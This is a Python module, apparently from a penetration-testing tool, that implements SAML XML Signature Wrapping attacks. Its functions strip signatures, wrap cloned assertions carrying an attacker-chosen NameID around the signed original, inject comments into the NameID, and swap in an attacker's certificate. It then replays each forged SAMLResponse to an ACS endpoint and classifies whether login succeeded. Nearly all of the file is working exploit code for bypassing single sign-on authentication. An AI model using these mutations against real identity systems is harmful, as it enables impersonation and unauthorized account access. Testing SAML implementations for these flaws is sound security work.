"""SAML XSW mutation builders + ACS replay + classification.

Helper/data module for probe_saml_xsw (saml_xsw_probe.py). Deterministic
string transforms over a captured SAMLResponse — no xmlsec/protocol dep.
"""

from __future__ import annotations

import base64
import re

from praetor import client


# Markers that indicate authentication SUCCEEDED post-replay
_AUTH_OK_MARKERS = (
    "set-cookie:",     # any new session cookie
    "location: /home",
    "location: /dashboard",
    "location: /admin",
    "location: /profile",
    "location: /account",
    "welcome",
    "logged in",
    '"authenticated":true',
)

# Markers that indicate the IdP REJECTED the signature
_SIG_REJECT_MARKERS = (
    "signature mismatch",
    "signature invalid",
    "signature verification",
    "invalid signature",
    "not signed",
    "missing signature",
    "samlerror",
    "saml_error",
    "auth failed",
    "authentication failed",
)


# Strip ds:Signature element using a tolerant regex (handles
# default-namespaced and prefixed signatures).
_SIG_RE = re.compile(
    rb"<((?:ds:)?Signature)\b[^>]*>.*?</\1>",
    re.DOTALL | re.IGNORECASE,
)

# Extract the original Assertion element for wrapping
_ASSERTION_RE = re.compile(
    rb"<((?:saml:|saml2:)?Assertion)\b[^>]*>.*?</\1>",
    re.DOTALL | re.IGNORECASE,
)

# Locate NameID for comment-injection
_NAMEID_RE = re.compile(
    rb"<((?:saml:|saml2:)?NameID)\b[^>]*>([^<]+)</\1>",
    re.IGNORECASE,
)


def _xsw_signature_exclusion(saml_xml: bytes) -> bytes:
    """Strip the entire ds:Signature element from the assertion."""
    return _SIG_RE.sub(b"", saml_xml)


def _xsw_wrap_assertion(saml_xml: bytes, attacker_nameid: str) -> bytes | None:
    """XSW1 — clone Assertion, place malicious copy BEFORE original.

    Tampered copy has attacker_nameid as Subject NameID. Original (with
    valid signature) is kept after — vulnerable parsers may validate the
    original signature but read the attacker's first-found Assertion.
    """
    m = _ASSERTION_RE.search(saml_xml)
    if not m:
        return None
    original = m.group(0)
    # Build malicious clone — replace NameID, drop Signature so parsers
    # don't double-verify it.
    clone = _NAMEID_RE.sub(
        b"<\\1>" + attacker_nameid.encode("ascii") + b"</\\1>",
        original,
    )
    clone = _SIG_RE.sub(b"", clone)
    # Insert clone BEFORE original
    return saml_xml[: m.start()] + clone + saml_xml[m.start():]


def _xsw_sibling_wrap(saml_xml: bytes, attacker_nameid: str) -> bytes | None:
    """XSW2 — malicious assertion as sibling AFTER signed one."""
    m = _ASSERTION_RE.search(saml_xml)
    if not m:
        return None
    original = m.group(0)
    clone = _NAMEID_RE.sub(
        b"<\\1>" + attacker_nameid.encode("ascii") + b"</\\1>",
        original,
    )
    clone = _SIG_RE.sub(b"", clone)
    return saml_xml[: m.end()] + clone + saml_xml[m.end():]


def _xsw_comment_injection(saml_xml: bytes, victim_local: str,
                           attacker_domain: str) -> bytes | None:
    """Inject HTML comment in NameID — parser strips comment but app reads full.

    Result: `victim<!---->@attacker.tld` validates as `victim@attacker.tld`
    in canonicalised form, but downstream lookups may use the literal.
    """
    payload = f"{victim_local}<!---->@{attacker_domain}".encode("ascii")
    out = _NAMEID_RE.sub(b"<\\1>" + payload + b"</\\1>", saml_xml, count=1)
    return out if out != saml_xml else None


def _xsw_keyinfo_swap(saml_xml: bytes, attacker_cert_pem: str) -> bytes | None:
    """Replace KeyInfo X509Certificate with attacker cert.

    Vulnerable verifier trusts embedded KeyInfo rather than out-of-band IdP
    cert — re-validates signature against attacker cert. Operator must
    provide a real cert; without it we return None (variant skipped).
    """
    if not attacker_cert_pem.strip():
        return None
    cert_body = attacker_cert_pem
    # Strip PEM headers if present
    cert_body = re.sub(r"-----BEGIN [^-]+-----", "", cert_body)
    cert_body = re.sub(r"-----END [^-]+-----", "", cert_body)
    cert_body = "".join(cert_body.split())  # drop whitespace
    x509_re = re.compile(
        rb"<((?:ds:)?X509Certificate)\b[^>]*>[^<]*</\1>",
        re.IGNORECASE,
    )
    out = x509_re.sub(
        b"<\\1>" + cert_body.encode("ascii") + b"</\\1>",
        saml_xml,
        count=1,
    )
    return out if out != saml_xml else None


def _classify_replay(resp: dict, baseline_status: int) -> tuple[str, str]:
    """Return (auth_state, evidence)."""
    body = resp.get("response_body") or ""
    headers_blob = " ".join(
        f"{k}: {v}" for k, v in (resp.get("response_headers") or {}).items()
    )
    haystack = (body[:8000] + " " + headers_blob).lower()

    for marker in _AUTH_OK_MARKERS:
        if marker in haystack:
            return "auth_ok", marker
    for marker in _SIG_REJECT_MARKERS:
        if marker in haystack:
            return "sig_rejected", marker
    status = resp.get("status_code", 0)
    if status in (200, 302) and status == baseline_status:
        return "ambiguous", f"status {status} matches baseline"
    if status in (400, 401, 403):
        return "rejected", f"status {status}"
    return "unknown", f"status {status}"


async def _send_acs(acs_url: str, saml_xml: bytes, relay_state: str,
                    method: str = "POST", timeout: int = 30) -> dict:
    """POST SAMLResponse (base64-encoded XML) to the ACS endpoint."""
    b64 = base64.b64encode(saml_xml).decode("ascii")
    form_body = f"SAMLResponse={b64}"
    if relay_state:
        form_body += f"&RelayState={relay_state}"
    payload = {
        "method": method,
        "url": acs_url,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "body": form_body,
        "follow_redirects": False,
        "timeout": timeout,
    }
    return await client.post("/api/http/curl", json=payload)


